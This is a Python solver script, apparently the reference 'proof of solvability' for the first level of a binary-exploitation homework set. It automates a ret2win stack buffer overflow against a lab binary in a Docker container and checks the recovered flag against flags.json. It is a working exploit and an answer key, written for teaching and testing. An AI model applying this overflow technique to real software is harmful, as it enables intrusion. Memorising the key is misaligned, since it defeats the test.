#!/usr/bin/env python3
"""Known-good exploit for rung1 (ret2win) — proof of solvability.

Runs against a live enigma-homework container from the HOST via docker exec.
Discovers the overflow offset empirically (De Bruijn pattern + gdb on the
crash), takes win's address from nm (static, no PIE), delivers
b'A'*offset + p64(win) on stdin, and checks the output against flags.json.

Usage: python3 solve_rung1.py <container_id_or_name>
Exit code 0 on PASS, 1 on FAIL.
"""
import json
import os
import re
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))


def docker_exec(cid, cmd, input_bytes=None):
    return subprocess.run(["docker", "exec", "-i", cid] + cmd,
                          input=input_bytes, capture_output=True, timeout=120)


# ---- De Bruijn cyclic pattern (pwntools-free) --------------------------------
def cyclic(n, subseq=4):
    """De Bruijn sequence over a lowercase alphabet, byte length >= n."""
    k = 26
    alphabet = [chr(ord('a') + i) for i in range(k)]
    a = [0] * (k * subseq)
    seq = []

    def db(t, p):
        if t > subseq:
            if subseq % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    pat = "".join(alphabet[i] for i in seq).encode()
    return pat[:n]


def cyclic_find(haystack, needle4):
    """Offset of a 4-byte chunk (little-endian register fragment)."""
    return haystack.find(needle4)


def discover_offset(cid, binary, fallback=72):
    """Offset from buffer start to the saved return address, discovered by
    crashing `binary` on a De Bruijn pattern under gdb. Two cases:
    - $rip itself is pattern bytes (canonical overwritten return address);
    - the ret faulted on a NON-canonical pattern address, so $rip still points
      at the ret instruction and $rsp still points at the return slot — read
      the qword at $rsp instead.
    Expect 72 (64-byte buf + saved rbp) at -O0."""
    pat = cyclic(256)
    docker_exec(cid, ["bash", "-c", "cat > /tmp/pat.txt"], input_bytes=pat)
    r = docker_exec(cid, ["gdb", "-q", "-batch",
                          "-ex", "run < /tmp/pat.txt",
                          "-ex", "info registers rip",
                          "-ex", "x/1gx $rsp",
                          binary])
    m = re.search(rb"rip\s+(0x[0-9a-f]+)", r.stdout)
    if m:
        rip = int(m.group(1), 16)
        off = cyclic_find(pat, struct.pack("<Q", rip)[:4])
        if off >= 0:
            print("[*] crash rip = 0x%x -> offset %d" % (rip, off))
            return off
    m = re.search(rb"0x[0-9a-f]+:\s+(0x[0-9a-f]+)", r.stdout)
    if m:
        slot = int(m.group(1), 16)
        off = cyclic_find(pat, struct.pack("<Q", slot))
        if off >= 0:
            print("[*] non-canonical ret; return slot @rsp = 0x%x -> offset %d"
                  % (slot, off))
            return off
    print("[!] gdb offset discovery inconclusive, falling back to -O0 layout: %d"
          % fallback)
    return fallback


def solve(cid):
    flags = json.load(open(os.path.join(HERE, "flags.json")))
    expected = flags["rung1"]

    # 1. win() address — static, non-PIE, so nm gives the absolute address.
    r = docker_exec(cid, ["nm", "/target/rung1"])
    m = re.search(rb"^([0-9a-f]+) [Tt] win$", r.stdout, re.M)
    if not m:
        print("FAIL: win not found in nm output:\n" + r.stdout.decode(errors="replace"))
        return False
    win_addr = int(m.group(1), 16)
    print("[*] win @ 0x%x" % win_addr)

    # 2. Offset to the saved return address (De Bruijn + gdb).
    offset = discover_offset(cid, "/target/rung1")

    # 3. Deliver the payload: padding + saved-rbp filler + ret = &win.
    payload = b"A" * offset + struct.pack("<Q", win_addr)
    r = docker_exec(cid, ["/target/rung1"], input_bytes=payload)
    out = r.stdout
    print("[*] target output:\n" + out.decode(errors="replace").strip())

    got = re.search(rb"flag\{[^}]*\}", out)
    if got and got.group(0).decode() == expected:
        print("PASS: rung1 solved, flag matches flags.json: %s" % expected)
        return True
    print("FAIL: expected %s, got %s" % (expected, got.group(0).decode() if got else None))
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        sys.exit(2)
    sys.exit(0 if solve(sys.argv[1]) else 1)
